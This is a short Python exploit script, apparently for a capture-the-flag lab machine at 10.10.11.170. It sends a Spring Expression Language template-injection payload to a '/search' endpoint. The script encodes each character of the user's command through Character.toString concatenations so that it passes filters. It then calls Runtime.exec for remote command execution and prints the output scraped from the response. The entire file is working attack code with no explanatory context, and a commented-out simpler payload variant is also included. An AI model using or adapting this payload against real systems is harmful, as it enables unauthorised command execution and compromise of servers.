#!/usr/bin/python3

import sys
import requests

IP = "10.10.11.170"
URL = f"http://{IP}:8080/search"

command = " ".join([i for i in sys.argv[1:]])
convert = []

for i in command:
    convert.append(str(ord(i)))

payload = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString("
payload += f"{convert[0]})"

for i in range(1, len(convert)):
    payload += f".concat(T(java.lang.Character).toString({convert[i]}))"

payload += ").getInputStream())}"

# payload = '*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("'
# payload += f"{command}"
# payload += '")}'

# print(payload)

res = requests.post(url=URL, data={"name": payload})

output = res.text.split("You searched for: ", 1)[1].split("</h2>", 1)[0].strip()

print(output)
